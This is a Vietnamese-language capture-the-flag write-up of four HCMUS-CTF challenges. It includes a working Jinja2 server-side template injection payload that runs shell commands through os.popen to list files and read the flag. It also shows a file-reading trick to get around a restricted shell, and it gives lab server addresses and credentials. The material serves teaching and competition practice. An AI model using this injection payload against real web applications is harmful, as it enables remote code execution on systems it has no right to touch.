# Nothingless
url: http://61.28.237.24:30103/
```
Sorry / is under construction. Please try again later
```
Đây là một vấn đề server side template injection
Ta kiểm tra thử xem thế nào
url: http://61.28.237.24:30103/{{1+1}}
```
Sorry /2 is under construction. Please try again later
```
Có thể là jinja2 chăng?<br/>
{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("ls").read()}}
```
Sorry /__pycache__ app.py requirements.txt is under construction. Please try again later
```
Cuối cùng <br/>
{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("cat ../flag_HKOOS2lrdD").read()}}
```
Sorry /HCMUS-CTF{404_teMpl4t3_1njEctIon} is under construction. Please try again later
```
flag: HCMUS-CTF{404_teMpl4t3_1njEctIon}

# Dodge
ssh ctf@61.28.237.24 -p30400<br/>
password: hcmus-ctf
Ban đầu ta test thử thì thấy ta có thể sử dụng lệnh ls và lệnh echo.<br/>
Ta có thể sử dụng lệnh shell thay cho cat
```shell
  while read line; do
    echo $line;
  done <flag.txt
```
flag: HCMUS-CTF{You_know_some_command_line_stuff}<br/>
Tham khảo: https://jarv.org/posts/cat-without-cat/

# StrangerThing

ssh ctf@61.28.237.24 -p30401<br/>
password: hcmus-ctf
```shell
cat flag1.txt 		                #=> HCMUS-CTF{this 
cat -- '-flag 2.txt' 		          #=> _is_used_to_test
ls ./secret/ -a                   #=> .flag3.txt
cat ./secret/.flag3.txt	          #=> _linux_command_line}
```
=> HCMUS-CTF{this_is_used_to_test_linux_command_line}
# Metadata
Lấy image từ dockerhub ở vinhph2/hcmus-ctf-2021<br/>
Inspect xem thử như thế nào 
![image](https://user-images.githubusercontent.com/20945393/119263609-f40aad00-bc09-11eb-83f7-b4678439360a.png)
flag: HCMUS-CTF{d0ck6r_1mag6_1nsp6ct}<br/>
fake flag: HCMUS{docker_image}

